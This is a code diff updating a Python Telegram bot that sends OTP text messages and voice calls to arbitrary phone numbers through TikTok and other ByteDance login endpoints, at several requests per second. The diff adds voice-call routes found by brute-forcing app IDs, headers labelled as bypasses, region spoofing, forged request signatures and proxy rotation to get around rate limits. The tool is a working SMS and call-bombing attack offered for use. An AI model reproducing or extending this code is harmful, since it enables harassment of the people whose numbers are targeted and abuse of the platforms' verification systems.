@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v11.0
+ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v12.0
 ===============================================================
 Features:
 1. 5-10 Concurrent OTP Requests Per Second
@@ -149,12 +149,12 @@ CHINESE_APP_DOMAINS = [
 # ============================================
 CONFIRMED_APPS = {
     "tiktok_ads": {
-        # 9 SUCCESSES: SG/DE/AU regions, web endpoint, no signing
+        # 9 SUCCESSES: SG/DE/AU regions, web endpoint, no signing + tc=3536 verified (Ultra Brute v2.0)
         "name": "TikTok Ads (CONFIRMED)", "aid": 1583, "app_name": "tiktok_web",
         "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
         "channel": "tiktok_web",
-        "type_codes": [3532, 3635],
-        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"],
+        "type_codes": [3532, 3635, 3536, 3631],
+        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com", "shop.tiktok.com"],
         "needs_proxy": True, "web_endpoint": True,
     },
     "douyin_s": {
@@ -192,12 +192,13 @@ CONFIRMED_APPS = {
         "register_domain": "api.amemv.com",
     },
     "bd7743_s": {
-        # SUCCESS: api16-normal-v4 tc=3635 AU, api16-normal-useast5 tc=3635 DE
+        # SUCCESS: api16-normal-v4 tc=3635 AU, tc=3132/3536 verified (Ultra Brute v2.0 Phase 4)
         "name": "BD 7743 (CONFIRMED)", "aid": 7743, "app_name": "musical_ly",
         "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
         "channel": "googleplay",
-        "type_codes": [3635, 3532],
-        "domains": ["api16-normal-v4.tiktokv.com", "api16-normal-useast5.us.tiktokv.com"],
+        "type_codes": [3635, 3536, 3132, 3532, 3733, 34, 3637, 3734, 3530],
+        "domains": ["api16-normal-v4.tiktokv.com", "api16-normal-v6.tiktokv.com",
+                    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-useast5.us.tiktokv.com"],
         "register_domain": "api3-normal-c-lf.amemv.com",
         "needs_proxy": True,
     },
@@ -255,6 +256,48 @@ CONFIRMED_APPS = {
         "domains": ["verify.zijieapi.com", "api.amemv.com", "api3-normal-c-lf.amemv.com"],
         "register_domain": "api.amemv.com",
     },
+    # ======== VOICE CALL ENDPOINTS (Ultra Brute v2.0 Phase 2 discovery) ========
+    "tiktok_voice": {
+        # Voice call OTP via /passport/mobile/send_voice_code/ — rate-limited (=works with fresh IP)
+        "name": "TikTok Voice Call (CONFIRMED)", "aid": 1233, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3731, 3532],
+        "domains": ["api16-normal-v6.tiktokv.com", "api16-normal-c-useast2a.tiktokv.com",
+                    "www.tiktok.com", "us.tiktok.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    "tiktok_lite_voice": {
+        "name": "TikTok Lite Voice Call (CONFIRMED)", "aid": 1340, "app_name": "trill",
+        "package": "com.zhiliaoapp.musically.go", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3532],
+        "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    "helo_voice": {
+        "name": "Helo Voice Call (CONFIRMED)", "aid": 1180, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3731, 3532],
+        "domains": ["api16-normal-v4.tiktokv.com", "api16-normal-c-useast2a.tiktokv.com",
+                    "us.tiktok.com", "api16-normal-v6.tiktokv.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    "bd259_voice": {
+        "name": "BD 259 Voice Call (CONFIRMED)", "aid": 259, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3635, 3731, 3532],
+        "domains": ["api16-normal-v6.tiktokv.com", "api16-normal-v4.tiktokv.com",
+                    "www.tiktok.com", "us.tiktok.com"],
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True, "voice_endpoint": True,
+    },
+    # ======== END VOICE CALL SECTION ========
     "bd2658_s": {
         # CONFIRMED SUCCESS in signed brute force (PR#5), currently rate-limited on all proxy IPs
         "name": "BD 2658/Lemon8 (CONFIRMED)", "aid": 2658, "app_name": "musical_ly",
@@ -492,6 +535,18 @@ BYTEDANCE_APPS = {
         "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
         "channel": "googleplay",
         "type_codes": [3635, 3532, 3637, 3634],
+        "domains": TIKTOKV_MOBILE_DOMAINS,
+        "register_domain": "api3-normal-c-lf.amemv.com",
+        "needs_proxy": True,
+    },
+    # ======== ULTRA BRUTE FORCE v2.0 DISCOVERED (AID 1-100000, 4 phases, ~204K tests) ========
+    "bd_2657": {
+        # NEW! Rate-limited on api-h2.tiktokv.com tc=3731 (Ultra Brute Phase 3)
+        # Verified rate-limited on multiple domains + type codes in Phase 4
+        "name": "ByteDance 2657 (Signed)", "aid": 2657, "app_name": "musical_ly",
+        "package": "com.zhiliaoapp.musically", "version_code": "350804", "version_name": "35.8.4",
+        "channel": "googleplay",
+        "type_codes": [3731, 3635, 3637, 3631, 3532, 34],
         "domains": TIKTOKV_MOBILE_DOMAINS,
         "register_domain": "api3-normal-c-lf.amemv.com",
         "needs_proxy": True,
@@ -862,6 +917,8 @@ class ByteDanceOTPSender:
             "mobile": encrypted_mobile,
             "type": str(type_code),
             "_rticket": rticket, "ts": str(timestamp),
+            # Enhanced params (discovered via Ultra Brute Force v2.0 research)
+            "is6Digits": "1", "check_register": "1", "multi_login": "1",
         })
         return urlencode(params)
 
@@ -901,6 +958,11 @@ class ByteDanceOTPSender:
             "X-SS-DP": str(config["aid"]),
             "User-Agent": f"{self.app['package']}/{config['version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{build_id}; Cronet/TTNetVersion:{cronet_parts[0]} {cronet_parts[1]} QuicVersion:c459d547 2024-08-27)",
             "Accept-Encoding": "gzip, deflate",
+            # Enhanced bypass headers (discovered via Ultra Brute Force v2.0 research)
+            "x-tt-bypass-dp": "1",
+            "x-tt-dm-status": "login=0;ct=0;rt=7",
+            "x-tt-store-region": random.choice(["au", "de", "sg", "us", "gb"]),
+            "x-tt-store-region-src": "did",
             "X-Gorgon": signatures.get("x-gorgon", ""),
             "X-Khronos": signatures.get("x-khronos", str(timestamp)),
             "X-Argus": signatures.get("x-argus", ""),
@@ -1037,6 +1099,49 @@ class ByteDanceOTPSender:
         finally:
             session.close()
 
+    VOICE_ENDPOINT = "/passport/mobile/send_voice_code/"
+
+    def _send_voice_call(self, phone: str, proxy: Optional[str] = None) -> Dict:
+        """Voice call OTP — uses same signing as mobile but /send_voice_code/ endpoint.
+        Discovered via Ultra Brute Force v2.0 Phase 2: rate-limited on TikTok, TikTok Lite, Helo, BD 259."""
+        start_time = time.time()
+        self.refresh_identity(proxy=proxy)
+        config = self._get_config()
+        cookies = self._get_cookies()
+        timestamp = int(time.time())
+        url_params = self._build_url_params(config, timestamp)
+        body = self._build_body(phone, config, timestamp)
+        cookie_str = self._build_cookie_string(cookies)
+        try:
+            signatures = self._generate_signatures(url_params, body, cookie_str, config)
+        except Exception as e:
+            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
+        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
+        headers = self._build_headers(config, cookies, timestamp, signatures, body, domain)
+        url = f"https://{domain}{self.VOICE_ENDPOINT}?{url_params}"
+        session = self._create_session(proxy)
+        try:
+            response = session.post(url, data=body, headers=headers, verify=False, timeout=REQUEST_TIMEOUT)
+            elapsed = (time.time() - start_time) * 1000
+            try:
+                result = response.json()
+                result["success"] = result.get("message") == "success"
+                result["proxy_used"] = proxy or "Direct"
+                result["device_id"] = config["device_id"]
+                result["method"] = "voice_call"
+                result["endpoint"] = self.VOICE_ENDPOINT
+                result["domain"] = domain
+                result["time_ms"] = elapsed
+                result["phone"] = phone
+                return result
+            except json.JSONDecodeError:
+                return {"error": "Invalid JSON", "raw": response.text[:200], "success": False,
+                        "method": "voice_call", "time_ms": elapsed, "phone": phone}
+        except requests.exceptions.RequestException as e:
+            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
+        finally:
+            session.close()
+
     def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None,
                       override_domain: Optional[str] = None, override_tc: Optional[int] = None) -> Dict:
         """Synchronous OTP send - Routes to appropriate method based on app config"""
@@ -1055,6 +1160,10 @@ class ByteDanceOTPSender:
         # Route to unsigned mobile if configured (no signing needed)
         if self.app.get("unsigned_mobile"):
             return self._send_unsigned_mobile(phone, proxy)
+
+        # Route to voice call endpoint if configured
+        if self.app.get("voice_endpoint"):
+            return self._send_voice_call(phone, proxy)
 
         # Default: signed mobile endpoint with device registration
         start_time = time.time()
@@ -1713,7 +1822,7 @@ async def apps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines_list = []
     for key, app in BYTEDANCE_APPS.items():
         marker = ' (current)' if key == current else ''
-        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "🔐 signed"
+        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "📞 voice" if app.get("voice_endpoint") else "🔐 signed"
         lines_list.append(f'<code>{key}</code> - {app["name"]} (AID={app["aid"]}) [{method}]{marker}')
     msg = "<b>Available ByteDance Apps:</b>\n\n" + "\n".join(lines_list) + "\n\n<b>Switch:</b> <code>/setapp douyin</code>"
     await update.message.reply_text(msg, parse_mode='HTML')
@@ -1735,7 +1844,7 @@ async def setapp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = []
     row = []
     for key, app in BYTEDANCE_APPS.items():
-        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "🔐"
+        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "📞" if app.get("voice_endpoint") else "🔐"
         btn_text = f"{method} {key} ({app['aid']})"
         row.append(InlineKeyboardButton(btn_text, callback_data=f"sa|{key}"))
         if len(row) == 2:
@@ -1754,7 +1863,7 @@ async def apps2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lines_list = []
     for key, app in CONFIRMED_APPS.items():
         marker = ' (current)' if key == current else ''
-        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "🔐 signed"
+        method = "🌐 web" if app.get("web_endpoint") else "📱 unsigned" if app.get("unsigned_mobile") else "📞 voice" if app.get("voice_endpoint") else "🔐 signed"
         lines_list.append(f'<code>{key}</code> - {app["name"]} (AID={app["aid"]}) [{method}]{marker}')
     msg = "<b>CONFIRMED SUCCESS Apps Only:</b>\n\n" + "\n".join(lines_list) + "\n\n<b>Switch:</b> <code>/setapp2 tiktok_ads</code>\n<b>Best regions:</b> AU, DE, SG"
     await update.message.reply_text(msg, parse_mode='HTML')
@@ -1775,7 +1884,7 @@ async def setapp2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = []
     row = []
     for key, app in CONFIRMED_APPS.items():
-        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "🔐"
+        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "📞" if app.get("voice_endpoint") else "🔐"
         btn_text = f"{method} {key} ({app['aid']})"
         row.append(InlineKeyboardButton(btn_text, callback_data=f"sa2|{key}"))
         if len(row) == 2:
@@ -2285,7 +2394,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id]['domain_mode'] = user_states[user_id].get('_pending_domain_mode', 'all')
         domain_display = user_states[user_id].get('_pending_domain_display', 'Random')
         domain_mode = user_states[user_id].get('domain_mode', 'all')
-        method = "🌐 Web" if app.get("web_endpoint") else "📱 Unsigned" if app.get("unsigned_mobile") else "🔐 Signed"
+        method = "🌐 Web" if app.get("web_endpoint") else "📱 Unsigned" if app.get("unsigned_mobile") else "📞 Voice" if app.get("voice_endpoint") else "🔐 Signed"
         confirmed = " (CONFIRMED)" if app_key in CONFIRMED_APPS else ""
         await query.edit_message_text(
             f"✅ <b>App configured{confirmed}:</b>\n\n"
